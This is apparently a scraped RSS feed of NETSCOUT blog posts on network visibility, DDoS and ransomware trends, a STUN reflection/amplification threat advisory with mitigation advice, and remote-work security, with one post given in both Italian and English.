
<p>As one of the new medical buildings came online, it quickly became clear that the WAN to that medical building presented a visibility gap that could affect the performance of Epic and <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="21c02415-ff1b-4b35-b21e-d3d9c7b93394" href="http://localhost:7996/solutions/unified-communications-collaboration" title="Unified Communications and Collaboration">Unified Communications &amp; Collaboration (UC&amp;C) services</a>, as well as clinical and business applications.

  <content:encoded><![CDATA[<p>The year 2020 was unlike any other for health care organizations. They faced unimaginable patient volumes due to the COVID-19 pandemic that pushed physician and staff support to its highest levels ever. Many doctors were never off duty. Many found themselves checking into their patient records remotely to stay current on patients’ treatments even when they should have been recharging.</p>

<p>Health care operations were further complicated by a shift affecting many of the nonmedical workforce. Finance and accounting personnel were just some of the staff that were transitioned to working from home and requiring remote access via virtual private network (VPN) or virtual desktop interface (VDI) connections. Dramatic increases in security threats from distributed denial-of-service (DDoS) and ransomware attacks presented an unprecedented challenge to availability and business continuity.&nbsp;</p>

<p>With patient care support in such high demand, and continuous network availability required for all employees regardless of where they were doing their jobs, comprehensive visibility at hospital data centers to protect against both performance-related and security-related issues was essential. Learn how one health care IT team strategically planned and implemented NETSCOUT’s nGeniusONE Service Assurance solution for visibility into performance and Arbor Edge Defense solution for DDoS protection to maintain access to patient services during the most challenging medical catastrophe in modern history.</p>

  <title>Making Analytics Smarter: How Smart Data Fuels Effective Analytics </title>
  <link>http://localhost:7996/blog/making-analytics-smarter</link>
  <description>When smart data is used to create smart analytics, service providers can make the most of data lakes, enabling data stakeholders to answer their troubleshooting, analytical, and executive questions.</description>
  <content:encoded><![CDATA[<p>For communication service providers, the wealth of untapped data within their networks can provide valuable insights and drive new opportunities—if it can be harnessed effectively. That, however, is no easy task. If you want to build from the most accurate data, IP packet data provides the best source of truth, because it represents what actually happened on the network. The sheer volume of data being captured, however, makes it nearly impossible to distill the relevant data and mine it for actionable insights.</p>

<p>This is where smart data comes in. By extracting and parsing the payloads and adding intelligence to packets, you can produce key performance indicators (KPIs) that power smart analytics. In this way, smart data begets smart analytics that service providers can use to take full advantage of artificial intelligence (AI) and machine learning (ML) tools.</p>

<p><strong>Enriching Data Lake Operations</strong></p>

<p>By utilizing smart data with smart analytics, service providers can bring enriched, multidimensional information to enhance data lake operations. Data lake are a centralized repository containing all of a provider’s unstructured, semi-structured, and structured data, which is then used for downstream applications. A service provider’s data lake already contains useful dimensions, such as subscriber and device identifiers. This data can be further enriched with information from the user plane and control plane packets to include network-specific details, including equipment vendor, radio access technology (RAT) extended geographic and application identifiers, network and device behavior, user experience, and more.</p>

<p>This enriched data record offers a new level of visibility that eliminates borders between vendors, radio generations and network types, handsets, and other technologies such as over-the-top video. Service providers can customize the feed, exporting only the data sets they need, reducing data size by removing fields they don’t want, and hiding personally identifiable information (PII) from records.</p>

<p>This refinement also lowers data lake costs by reducing feeds down to the information that is specifically useful to various functional groups of the service provider.</p>

<p><strong>Enabling Data Science </strong></p>

<p>When smart data is combined with smart analytics, service providers can make clean and highly curated data available for use by AI and ML network automation orchestration tools, ensuring high-quality output. Without smart data, the output is uncertain. To put it bluntly: garbage in, garbage out.</p>

<p>Smart data is key to enabling effective data science. Smart data powers new algorithms and automated analytics that provide observability into a provider’s services as well as data awareness beyond traditional operational insights from fixed workflows. The components of smart data are the foundation that allows data scientists to build data applications.</p>

<p>For data scientists, the ability to see inside a service and understand what’s happening under the hood based on available clues is invaluable. Smart data allows data scientists to solve business questions. A centrally managed data lake enables service providers to apply custom policies, information lifecycle rules to whole swaths of data all at once. Then different data sources can be blended together, exposing unique and interesting opportunities for the business.</p>

<p>When smart data is used to create smart analytics, service providers are able to make the most of their data lakes to enable all data stakeholders—from operations to data scientists to business users—to answer their troubleshooting, analytical, and executive questions.</p>

  <title>Cyberattacks Escalate, Putting Enterprises on the Defensive</title>
  <link>http://localhost:7996/blog/cyberattacks-escalate-putting-enterprises-defense</link>
  <description>NETSCOUT’s 16th annual Worldwide Infrastructure Security Report (WISR) finds DDoS extortion attacks grew by a whopping 125 percent in 2020.</description>
  <content:encoded><![CDATA[<p>How serious is the threat to enterprises from cyberattacks? Look no further than Colonial Pipeline, whose 5,500-mile-long pipeline carries 45 percent of the U.S. East Coast’s fuel supplies. This vital fuel supplier was forced to temporarily shut down after a ransomware attack, leading to panic buying and gas hoarding.</p>

<p>According to the <a href="https://www.theguardian.com/technology/2021/may/13/colonial-pipeline-ransomware-attack-cyber-crime"><em>Guardian</em></a>, “The wider American public was afforded an unwanted glimpse into the wild west world of ransomware this week, after a cyberattack crippled Colonial Pipeline, causing fuel shortages across the eastern seaboard and states of emergency to be declared in four states.”</p>

<p>And this was just the tip of the proverbial iceberg.</p>

<p><strong>Remote Work Model Brings New Vulnerabilities </strong></p>

<p>Since the beginning of the COVID-19 pandemic and the resulting tectonic shift to remote work and online collaboration services, enterprises have come under increased threats from cyberattacks. NETSCOUT’s 16th annual <a href="https://www.netscout.com/threatreport">Worldwide Infrastructure Security Report</a> (WISR) found that in 2020, distributed denial-of-service (DDoS) extortion attacks grew by a whopping 125 percent.</p>

<p>Nearly half of survey respondents reported an increase in DDoS attacks during the pandemic, many of which targeted vulnerabilities exposed by a significant shift to online services. 83 percent of enterprises that suffered a DDoS attack reported that overloaded firewalls and/or VPN devices contributed to an outage, a 21 percent jump year over year. These devices need to be protected because they perform a vital role for organizations deploying pandemic-related work/learn-from-home scenarios. </p>

<p>Cybercriminals have been relentless in their attacks. The WISR, which offers insights from a global survey of network, security, and IT decision-makers across enterprise organizations, revealed that more than 66 percent of enterprises reported DDoS attacks that targeted customer-facing services and applications. The report also found 75 percent had their infrastructure targeted. Because these attacks affect an organization’s ability to service customers, they often directly impact revenue and profitability.</p>

<p><strong>Frequency and Complexity of Attacks Are on the Rise</strong></p>

<p>The WISR also confirmed that the frequency and complexity of attacks are on the rise. The report found the number of DDoS attacks that exceeded the target’s internet bandwidth rose from 43 percent to 50 percent, which is indicative of increased attack frequency. At the same time, more than 66 percent of enterprises were the subject of complex DDoS attacks in 2020, according to the WISR. Of these attacks, 57 percent were multivector attacks, compared with 38 percent in 2019.</p>

<p>Also of concern to enterprises is the growing threat from infected or compromised Internet of Things (IoT) devices. The WISR revealed that IoT vulnerability was a top IoT concern for half of the surveyed enterprises.</p>

<p>Firewalls represent another security concern for enterprises. Although firewalls are an effective perimeter security tool against certain kinds of threats, they are not truly intended to stop DDoS attacks. The WISR found that 62 percent of enterprises are using next-gen firewalls to detect threats against their networks, but high failure rates present a notable problem.</p>

<p>One thing is certain: As we move forward, these threats are not likely to go away—or even diminish. That means security professionals must remain vigilant to protect the critical infrastructure that connects and enables the modern world.</p>

  <title>Session Traversal Utilities for NAT (STUN) Reflection/Amplification</title>
  <link>http://localhost:7996/blog/asert/session-traversal-utilities-nat-stun</link>
  <description>Adversaries weaponize STUN servers by incorporating the protocol into DDoS-for-Hire services. Approximately 75k abusable STUN servers give DDoS attackers ample opportunity to launch single-vector STUN attacks as large as 441 Gbps, or use the protocol in multi-vector attacks of a significantly greater size. Learn how to mitigate attacks leveraging STUN in our analysis.</description>
  <content:encoded><![CDATA[<h2>ASERT Threat Summary</h2>

<p><strong>Date/Time:</strong> 2Jun2021 1600UTC<br />
<strong>Severity:</strong> Warning<br />
<strong>Distribution:</strong> TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a><br />
<strong>Categories:</strong> Availability<br />
<strong>Contributors:</strong> Chris Conrad, Jon Belanger, Hardik Modi</p>

<h2>Summary</h2>

<p>ASERT recently discovered an increase in Session Traversal Utilities for NAT (STUN) protocol (see below) attacks targeting NETSCOUT customers. These attacks leverage vulnerable systems running STUN services and enable adversaries to launch UDP-based reflection/amplification attacks against a target of their choosing. We have seen an amplification factor of 2.32 to 1 with approximately 75,000 abusable STUN servers in the wild. The availability of vulnerable STUN servers, its amplification factor, and its inclusion into weaponized tools by adversaries makes STUN a problem for any organization, and the guidance provided by ASERT in this summary will give organizations the understanding and knowledge to properly defend against and mitigate these types of attacks.</p>

<h2>Key Findings</h2>

<p>&nbsp;</p>

<ul>
	<li>Adversaries weaponized vulnerable STUN servers by adding the UDP distributed-denial-of-service (DDoS) attack vector to their DDoS-for-hire services.</li>
	<li>Although the amplification factor is smaller than many others at 2.32 to 1, the use of STUN in reflection/amplification DDoS attacks has become increasingly prevalent due to the perceived difficulty of mitigating amplified STUN attack traffic without incurring unacceptable levels of overblocking.</li>
	<li>The collateral impact of STUN reflection/amplification attacks is potentially quite high if those STUN servers are also TURN servers used for relaying WebRTC multimedia traffic such as that associated with popular voice/videoconferencing systems.</li>
	<li>Applying the recommended actions outlined below will allow organizations to better understand and defend against attacks leveraging the STUN protocol.</li>
</ul>

<p>&nbsp;</p>

<h2>What is STUN?</h2>

<p>STUN is a protocol used to effectuate mappings between ‘inside’ and ‘outside’ IP addresses and protocol ports for hosts situated behind NAT installations. It is utilized by various services such as Session Initiation Protocol (SIP), Interactivity Connectivity Establishment (ICE), and Travels Using Relays around NAT (TURN). STUN may be configured to operate over both TCP and UDP transports.</p>

<h2>Analysis</h2>

<p>STUN services listening on UDP/3478, UDP/8088, and UDP/37833 may be abused to launch UDP reflection/amplification attacks with an average amplification ratio of 2.32:1. The amplified attack traffic consists of non-fragmented UDP packets sourced from any of the three listed UDP ports and directed towards the destination IP address(es) and UDP port(s) of the attacker’s choice. The amplified attack packets range from 48 bytes (the vast majority of attack traffic) to 1452 bytes in length. 75,556 abusable STUN servers have been identified to date.</p>

<p>Observed attack bandwidth (bps) sizes range from ~15 Gbps to ~60 Gbps for single-vector STUN reflection/amplification attacks and up to an aggregate 2 Tbps for multivector attacks that include STUN as a component. The highest observed throughput (pps) for a single-vector STUN reflection/amplification attack is ~6 Mpps and up to an aggregate ~836.3 Mpps for multivector attacks that include STUN as a component. As is routinely the case with newer DDoS attack vectors, it appears that after an initial period of employment by advanced attackers with access to bespoke DDoS attack infrastructure, STUN reflection/amplification has been weaponized and added to the arsenals of so-called ‘booter/stresser’ DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<p>Although the average STUN amplified attack traffic yield of 2.32:1 is relatively low compared with other vectors, the use of STUN in reflection/amplification DDoS attacks has become increasingly prevalent due to the perceived difficulty of mitigating amplified STUN attack traffic without incurring unacceptable levels of overblocking.</p>

<h2>Collateral Impact</h2>

<p>The collateral impact of STUN reflection/amplification attacks is potentially quite high for organizations whose STUN servers are abused as reflectors/amplifiers. This is particularly true if those STUN servers are also TURN servers used for relaying WebRTC multimedia traffic such as that associated with popular voice/videoconferencing systems. (All TURN servers are also STUN servers, although the converse is not the case). Abuse of STUN servers as reflectors/amplifiers may result in partial or full interruption of NAT traversal capability and a concomitant degradation or loss of general internet connectivity for STUN-dependent user populations, as well as additional service disruption due to transit capacity consumption, state-table exhaustion of NAT installations, stateful firewalls, load-balancers, etc.</p>

<p>Wholesale filtering of all UDP/3478-, UDP/8088-, and UDP/37833-sourced traffic by network operators may potentially overblock legitimate internet traffic, resulting in significant service disruption per the above-mentioned use cases.&nbsp;</p>

<h2>Mitigating Factors</h2>

<p>Collateral impact to abusable STUN servers can alert systems administrators to disable STUN UDP services and configure STUN to run in TCP mode only.</p>

<h2>Recommended Actions</h2>

<p>Network operators should perform reconnaissance to identify and remediate abusable STUN servers on their networks and/or the networks of their downstream customers.</p>

<p>All relevant network infrastructure, architectural, and operational Best Current Practices (BCPs) should be implemented by network operators.</p>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural, and operational BCPs have been implemented, including situationally specific network-access policies that only permit internet traffic via required IP protocols and ports. Internet-access network traffic from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links.&nbsp;</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Both organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources; the relevant NETSCOUT Arbor account teams and/or the Arbor Technical Assistance Center (ATAC) may be consulted with regards to optimal countermeasure selection and employment.</p>

  <title>Aumentano le tattiche di tripla estorsione per le gang ransomware</title>
  <link>http://localhost:7996/it/blog/aumentano-le-tattiche-di-tripla-estorsione-le-gang-ransomware</link>
  <description>I criminali informatici hanno fatto tripletta ransomware unendo crittografia dei file, furto di dati e attacchi DDoS.</description>
  <content:encoded><![CDATA[<p>Come ogni imprenditore intelligente, gli attori delle minacce sanno che il successo delle loro attività dipende dalle loro ultime innovazioni. E quando si tratta di sottrarre denaro alle organizzazioni non protette, queste innovazioni non si fermano mai.</p>

<p>L'ultima consiste nell'integrare gli attacchi in un portafoglio ransomware-as-a-service (RaaS) per creare il cosiddetto triplo attacco cyberextortion, un mix tra riscatto, estorsione DDoS e un bel po' di problemi. Ecco come funziona:</p>

<ol>
	<li><strong>Crittografia.</strong> Con il tradizionale metodo di attacco ransomware, i criminali informatici violano una rete e ne criptano dati preziosi, rendendoli non disponibili per l'organizzazione vittima e talvolta interessando l'intero sistema. Gli aggressori chiedono quindi un pagamento in cambio di una chiave di decrittazione.&nbsp;</li>
	<li><strong>Furto.</strong> In questo caso, i criminali informatici esfiltrano i dati prima di bloccare il sistema della vittima, quindi minacciano di esporre e/o vendere i dati pubblicamente se non vengono pagati. Questo secondo livello di estorsione rende più difficile per le vittime ignorare le minacce ransomware, perché anche chi ha la possibilità di utilizzare i backup per ripristinare i dati rimane a rischio di esposizione dei dati. Chiaramente, si tratta di un valido strumento di monetizzazione: secondo una stima di <a href="https://www.coveware.com/blog/q3-2020-ransomware-marketplace-report#:~:text=Average%20Ransomware%20Increases%20as%20Attackers%20Target%20Bigger%20Companies&amp;text=The%20average%20ransom%20payment%20increased,to%20drag%20the%20averages%20up.">Coveware</a>, quasi la metà dei casi di ransomware nel terzo trimestre del 2020 ha visto l’utilizzo di tattiche di esfiltrazione.</li>
	<li><strong>Attacchi DDoS.</strong> Comunemente utilizzati come <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">metodo di estorsione indipendente</a>, gli attacchi DDoS figurano adesso nella lista dei servizi offerti dagli operatori RaaS. Questo aumenta ulteriormente la pressione sulla vittima in due modi: in primo luogo, mette in evidenza la pericolosità dell'avversario. In secondo luogo, il mantenimento della disponibilità aggiunge un ulteriore fattore di stress a un team di sicurezza che già si occupa dei primi due eventi.</li>
</ol>

<p>Combinando crittografia dei file, furto di dati e attacchi DDoS, i criminali informatici hanno essenzialmente creato una tripletta ransomware progettata per aumentare le possibilità di pagamento. Secondo <a href="https://www.bleepingcomputer.com/news/security/ransomware-gangs-add-ddos-attacks-to-their-extortion-arsenal/">Bleeping Computer</a>, i primi utilizzatori di questa tattica sono stati SunCrypt e Ragnor Locker. Da allora si sono uniti altri operatori ransomware, tra cui <a href="https://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/">Avaddon</a> e <a href="https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">Darkside</a>, autore dell'attacco a Colonial Pipeline.</p>

<p>Dal punto di vista dell'attore delle minacce, aggiungere gli attacchi DDoS a una lista di servizi ransomware è una mossa commerciale intelligente. Gli attacchi DDoS sono incredibilmente economici e facili da lanciare e aumentano le possibilità di pagamento da parte delle vittime. Che cosa c'è di strano? Dopo tutto, si tratta di un business molto redditizio e i cattivi aggiungono costantemente nuove armi alle proprie multiformi campagne di attacco. (Alcuni operatori stanno persino aggiungendo l'equivalente dei <a href="https://krebsonsecurity.com/2021/05/a-closer-look-at-the-darkside-ransomware-gang/">centri di assistenza</a> per aiutare le vittime con la decrittazione.)</p>

<p>Il punto fondamentale è che l'aumento delle tattiche di pressione aumenta le probabilità di pagamento, rendendo il ransomware una forma sempre più dirompente di crimine informatico che colpisce non solo le aziende ma anche enti, scuole e infrastrutture pubbliche.</p>

<p>Stiamo assistendo a risposte alla crisi, come la <a href="https://securityandtechnology.org/ransomwaretaskforce/">Ransomware Task Force</a> (RTF) creata dall'Institute for Security and Technology. Composta da un'ampia coalizione di esperti del settore industriale, del governo, delle forze dell'ordine, della società civile e delle organizzazioni internazionali, la RTF ha recentemente rilasciato alcune <a href="https://securityandtechnology.org/ransomwaretaskforce/report/">raccomandazioni chiave</a> per combattere quello che il gruppo descrive come un rischio urgente per la sicurezza. Anche se è pur sempre un inizio, ci vorrà uno sforzo globale continuativo per mettere un freno all'attività ransomware.</p>

<p>Nel frattempo, le aziende devono osservare alcune precauzioni fondamentali:</p>

<ul>
	<li><strong>Evitare la violazione della rete.</strong> Le best practice includono la sensibilizzazione degli utenti riguardo a una corretta igiene di cybersecurity e l'impiego di <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">soluzioni di protezione della rete e degli endpoint</a> per rilevare malware, attività anomale o Indicator of Compromise (IoC).</li>
	<li><strong>Ricordare sempre le nozioni di base.</strong> Eseguire il backup dei dati importanti e testare i piani di ripristino dei dati. Eseguire valutazioni di vulnerabilità, applicare patch e aggiornare i sistemi informatici di conseguenza per evitare compromissioni.</li>
	<li><strong>Fare regolarmente uso dell'intelligence sulle minacce.</strong> Rimanere al passo con le più recenti informazioni sulle minacce aiuta le aziende a rilevare, indagare o cercare proattivamente gli IoC che potrebbero precedere un attacco ransomware.</li>
	<li><strong>Utilizzare una protezione DDoS adeguata.</strong> Gli attacchi DDoS stanno aumentando in termini di dimensioni, frequenza e complessità. Le best practice nella mitigazione DDoS includono una combinazione ibrida e intelligente di mitigazione DDoS basata sul cloud e on-premise.</li>
</ul>

<p>Infine, le organizzazioni devono anche cercare di implementare soluzioni di cybersecurity specialistiche, in grado di contrastare tutte le sfaccettature di un attacco di tripla estorsione.</p>

  <title>Triple-Extortion Tactics on the Rise for Ransomware Gangs</title>
  <link>http://localhost:7996/blog/triple-extortion-tactics-rise-ransomware-gangs</link>
  <description>Cybercriminals have hit the ransomware trifecta by melding file encryption, data theft, and DDoS attacks. Learn more about this growing threat.</description>
  <content:encoded><![CDATA[<p>Like any smart entrepreneur, threat actors know that their business is only as successful as their latest innovation. And when it comes to parting unsecured organizations from their money, those innovations never stop.</p>

<p>The latest involves integrating attacks into a ransomware-as-a-service (RaaS) portfolio to create the so-called triple cyberextortion attack. It’s a little bit ransom, a little bit DDoS extortion, and a lot of trouble. Here’s how it works:</p>

<ol>
	<li><strong>File encryption.</strong> With the traditional ransomware attack method, cybercriminals breach a network and encrypt valuable data, making it (and sometimes the entire system) unavailable to the victim organization. The attackers then demand payment in return for a decryption key.</li>
	<li><strong>Data theft.</strong> Here, cybercriminals exfiltrate the data before locking the victim out. They then threaten to expose and/or sell the stolen data publicly unless paid. This second level of extortion makes it harder for victims to ignore ransomware threats, because even those who can use backups to restore data remain at risk of data exposure. Clearly, it’s a valuable monetization tool: <a href="https://www.coveware.com/blog/q3-2020-ransomware-marketplace-report#:~:text=Average%20Ransomware%20Increases%20as%20Attackers%20Target%20Bigger%20Companies&amp;text=The%20average%20ransom%20payment%20increased,to%20drag%20the%20averages%20up.">Coveware</a> estimates that nearly half of ransomware cases in the third quarter of 2020 used exfiltration tactics.</li>
	<li>&nbsp;<strong>DDoS attacks.</strong> Commonly used as a <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">standalone extortion method</a>, DDoS attacks now are on the list of services RaaS operators offer. This further ratchets up the pressure on the victim in a couple of ways: First, it emphasizes the seriousness of the adversary. And second, maintaining availability also adds another stressor to a security team already dealing with the first two events.</li>
</ol>

<p>By combining file encryption, data theft, and DDoS attacks, cybercriminals have essentially hit a ransomware trifecta designed to increase the possibility of payment. According to <a href="https://www.bleepingcomputer.com/news/security/ransomware-gangs-add-ddos-attacks-to-their-extortion-arsenal/">Bleeping Computer</a>, SunCrypt and Ragnor Locker were early users of this tactic. Since then, other ransomware operators have jumped aboard, including <a href="https://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/">Avaddon</a> and <a href="https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">Darkside</a>, the perpetrator of the Colonial Pipeline incident.</p>

<p>From the threat actor’s perspective, adding DDoS attacks to a list of ransomware services is a smart business move. DDoS attacks are incredibly cheap and easy to launch, and they might increase the chance that a victim will pay. What’s not to like? After all, this is a very lucrative business, and bad actors are constantly adding new weapons to their multifaceted attack campaigns. (We are even seeing operators add the equivalent of <a href="https://krebsonsecurity.com/2021/05/a-closer-look-at-the-darkside-ransomware-gang/">support centers</a> to help victims with decryption.)</p>

<p>The bottom line is that increasing pressure tactics ups the likelihood of a payoff, making ransomware an increasingly disruptive form of cybercrime that affects not only companies but also governments, schools, and public infrastructure.</p>

<p>We are seeing responses to the crisis, such as the <a href="https://securityandtechnology.org/ransomwaretaskforce/">Ransomware Task Force</a> (RTF) created by the Institute for Security and Technology. Made up of a broad coalition of experts in industry, government, law enforcement, civil society, and international organizations, the RTF recently released <a href="https://securityandtechnology.org/ransomwaretaskforce/report/">key recommendations</a> to combat what the group characterizes as an urgent security risk. It’s a start, but it will take a sustained global effort to put a dent in ransomware activity.</p>

<p>In the meantime, companies must adhere to some fundamental protections:</p>

<ul>
	<li><strong>Avoid the network breach.</strong> Best practices include educating users on proper cybersecurity hygiene and employing network and <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">endpoint cybersecurity protection solutions</a> to detect malware, anomalous activity, or indicators of compromise (IoCs).</li>
	<li><strong>Pay attention to the basics. </strong>Back up valuable data and test data restoration plans. Run vulnerability assessments, patch, and update computer systems accordingly to avoid compromise.</li>
	<li><strong>Deploy continuous threat intelligence.</strong> Staying abreast of the latest threat intelligence helps companies detect, investigate, or proactively hunt for IoCs that could precede a ransomware attack.</li>
	<li><strong>Use proper DDoS protection.</strong> DDoS attacks are increasing in size, frequency, and complexity. Best practices in DDoS mitigation include a hybrid, intelligent combination of cloud-based and on-premises DDoS mitigation.</li>
</ul>

<p>Finally, organizations should also look to deploy specialized cybersecurity solutions that can help thwart all facets of a triple extortion attack.</p>

  <title>It’s Time to Rethink Remote-Work Quick Fixes</title>
  <link>http://localhost:7996/blog/rethinking-remote-work</link>
  <description>The distributed network will soon be the backbone of service deliveries across sectors. To ensure business continuity, companies must have real-time visibility into their entire network infrastructure to plan, run, and evaluate the risks to their operations.</description>
  <content:encoded><![CDATA[<p>After a year of change for customers and employees (and IT infrastructures) during COVID-19, it appears distributed operations are here to stay. The question for many companies is the same: Are the <a href="https://www.netscout.com/blog/remote-work-wake-call-digital-infrastructure">remote-working and network provision</a>s they put in place for the pandemic enough?</p>

<p>At NETSCOUT, we define end-user experience by its five tenets: availability, reliability, responsiveness, quality, and security. Now that the world has changed irrevocably, the network has become even more critical for businesses to function, skyrocketing the importance of these five tenets.</p>

<p><strong>The Rise and Stall of the VPN </strong></p>

<p>When the pandemic forced organizations to send employees home, use of the virtual private network (VPN) exploded—often to support the remote working of an entire workforce, a task the VPN was never designed for.</p>

<p>Deploying a VPN in this way is not only unscalable; it’s a <a href="https://www.netscout.com/sites/default/files/2020-07/EWP_026_EN-2001%20-%20Ensuring%20Business%20Continuity.pdf">productivity killer</a>. <a href="https://www.spglobal.com/en/research-insights/featured/coronavirus-flash-survey-march-2020">One recent report</a> found that remote access infrastructures that support remote work simply do not provide enough capacity for everyone to work effectively, causing sluggish response times, crashes, and even outages. Ultimately, this damages the productivity of your end users, delaying project timelines and increasing costs.</p>

<p>Delays during 2020 were understandable, but with all arrows now pointing to the remote way of working becoming “normal” and with the number of permanent remote workers <a href="https://www.reuters.com/article/us-health-coronavirus-technology/permanently-remote-workers-seen-doubling-in-2021-due-to-pandemic-productivity-survey-idUSKBN2772P0">expected to double in 2021</a>, businesses must start viewing their distributed networks as core to their long-term business continuity strategies.</p>

<p><strong>CX to Digital CX</strong></p>

<p>A poor end-user experience can damage your employee productivity, and this can have a knock-on effect on customer experience (CX), but what about the customer’s direct online experience? During the pandemic, the digital experience became the only experience, and great network performance became a vital ingredient for customer retention.</p>

<p>For industries such as ecommerce, poor network performance—a lag time of two to five seconds, for example—would cause many customers to abandon ship (or cart). For sectors such as financial services, where customers have trusted the organization with their money and personal information, performance issues can be even more damaging.</p>

<p><strong>The Need for Visibility</strong></p>

<p>There are two sides to the new digital business continuity coin: ensuring your employees can work to the same capacity remotely as they can in the office (via VPN), and delivering an amazing, consistent digital customer experience.</p>

<p>Just because your teams can work remotely does not mean the job is done. As the needs and size of your internal teams and the behavior of your customers change, you need visibility across your entire network infrastructure to plan, run, and evaluate the risks of your operations.</p>

<p>With the new way of working becoming a permanent reality, visibility is no longer a luxury: it’s critical for ensuring the user experience is one of availability, reliability, responsiveness, and high quality while remaining secure across newly distributed environments such as hybrid clouds.</p>

<p>With a solution that provides real-time visibility into not only user experience but also its components of network time, server performance, and client time, IT teams can easily track down any culprits damaging performance in the network—culprits that would never appear in standard application monitoring tools or network performance monitors.</p>

<p>The distributed network will soon be the backbone of service deliveries across sectors. To ensure businesses continuity, companies must assure the network for the new remote future of work.</p>

  <title>Remote Working Changes Are Here to Stay—Are Your Network Vulnerabilities?</title>
  <link>http://localhost:7996/blog/remote-working-here-to-stay</link>
  <description>DDoS attacks broke records in 2020, thanks to COVID-19, surpassing 10 million. With remote work looking to be a permanent choice for many workers, businesses must find permanent, distributed network security solutions that protect their people and their service performance.</description>
  <content:encoded><![CDATA[<p>Bad actors are constantly changing and improving the efficacy of their methods, and that of course includes <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks. But last year was unique: instead of the hackers changing, the world changed for them, and DDoS attacks peaked at an all-time high. Now, with many of the changes (such as remote working) here to stay, the pressure is on for businesses to find permanent, distributed network security solutions that protect their people and their service performance in the new way of working.</p>

<p>2020 saw unprecedented DDoS attack activity. For the first time in history, the annual number of observed DDoS attacks surpassed 10 million, and this record-breaking DDoS activity has <a href="https://www.netscout.com/blog/asert/beat-goes">surged into 2021</a>. This is perhaps no surprise: The digital shift caused by the COVID-19 pandemic saw nearly every business in the world become completely reliant on their VPNs, firewalls, and load balancers—obvious weak spots, and prime targets for attackers.</p>

<p>All these devices are “stateful,” making them particularly vulnerable to DDoS attacks. One such attack is a state exhaustion. These can be small and short-lived—in fact, just a couple of hundred megabits per second throughput for a few minutes can take down an entire VPN gateway.</p>

<p>And although these DDoS attacks were large in number, they were also accurate at striking pandemic-driven vulnerabilities. According to NETSCOUT’s 16<sup>th</sup> annual <a href="https://www.netscout.com/threatreport">Worldwide Infrastructure Security Report</a>, 75 percent of enterprises reported DDoS attacks on key pandemic infrastructures such as routers, firewalls, and VPN concentrators. Furthermore, the report found that 83 percent of enterprises that suffered a DDoS attack also reported that firewalls and/or VPN devices contributed to outages.</p>

<p><strong>Lasting Changes</strong></p>

<p>As the end of lockdown comes into view for many countries, it’s becoming clear that the changes to the way we work that drove these attacks will outlast COVID-19. Dutch lender Rabobank predicts its employees will continue to work from home <a href="https://www.bloombergquint.com/business/europe-s-banks-get-serious-about-work-from-home-after-pandemic">40 to 50 percent of the time</a>, and the UK’s Nationwide has committed to making its <a href="https://www.bbc.com/news/business-56510574">telework changes permanent</a>.</p>

<p>Like the pandemic, this shift impacts not only how companies interact with their staff but also how they interact with their customers, who won’t stop taking advantage of rapid online self-servicing and automation once off-line capabilities resume.</p>

<p>The network has become one with the business, and so the risks of DDoS attacks (such as increased costs, lost revenue due to service downtime, or a hit to reputation) are greater than ever, impacting the delivery of all your digital services.</p>

<p><strong>A Permanent Solution</strong></p>

<p>These temporary weak spots have become permanent, so organizations need to look to expert solutions they can rely on to assure digital business services against disruptions in availability, performance, and security.</p>

<p>The industry best practice for protecting VPN gateways and other stateful devices critical for remote function is to roll out an on-premises “stateless” solution.</p>

<p>NETSCOUT uses stateless packet processing technology, and by deploying one of its advanced defense solutions at the network perimeter (behind the internet router and in front of stateful devices such as your VPN gateway), you can instantaneously detect all types of DDoS attacks, including state exhaustion attacks, before any damage is done.</p>

<p>Distributed working elevates the security risks of your network, but remote work is here to stay. This means the onus is on firms to achieve permanent security to ensure their network is more secure, more performant, and more protected than ever before.</p>

  <title>4 Post-Pandemic Cybersecurity Trends</title>
  <link>http://localhost:7996/blog/4-post-pandemic-cybersecurity-trends</link>
  <description>Cyberattackers are taking advantage of shifts in business connectivity, finding new ways to exploit security vulnerabilities. This evolving threat environment makes it necessary to increase cybersecurity vigilance.</description>
  <content:encoded><![CDATA[<p>During the past year, IT and network professionals at nearly every enterprise were forced into action as remote work became the norm following the arrival of the COVID-19 pandemic. This has resulted in <a href="https://www.netscout.com/blog/remote-work-wake-call-digital-infrastructure">large-scale change</a> for remote access architectures, as well as for cloud and cloud-delivered services. In many cases, there has been an increased adoption of software-as-a-service (SaaS) models.</p>

<p>Of course, with these significant changes have come heightened cybersecurity risks. Cyberattackers are taking advantage of shifts in business connectivity, finding <a href="https://www.netscout.com/blog/asert/beat-goes">new ways to exploit security vulnerabilities</a>.</p>

<p>This evolving threat environment has made it necessary to increase vigilance related to cybersecurity. The recently published white paper “Cyber Security After the Pandemic,” from HardenStance, outlines four important trends.</p>

